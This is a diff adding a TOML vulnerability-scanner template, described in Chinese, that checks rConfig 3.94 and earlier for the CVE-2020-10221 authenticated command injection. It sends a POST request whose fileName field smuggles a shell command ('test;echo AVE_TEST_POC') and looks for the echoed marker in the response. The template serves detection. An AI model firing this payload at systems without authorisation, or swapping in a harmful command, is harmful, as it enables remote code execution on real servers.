@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 rConfig 3.94 及更早版本中 lib/ajaxHandlers/ajaxAddTemplate.php 的 OS 命令注入漏洞。通过向 fileName POST 参数注入 shell 元字符，验证是否可执行任意系统命令。需要低权限认证账号。"
+id = "POC-AVE-2020-0109"
+name = "rConfig ajaxAddTemplate.php 认证远程命令执行 PoC"
+severity = "high"
+tags = [
+    "cve-2020-10221",
+    "rconfig",
+    "rce",
+    "command-injection",
+]
+vuln_id = [
+    "CVE-2020-10221",
+    "AVE-2020-0109",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/lib/ajaxHandlers/ajaxAddTemplate.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "fileName=test;echo%20AVE_TEST_POC&templateName=test&templateDescription=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST_POC"]
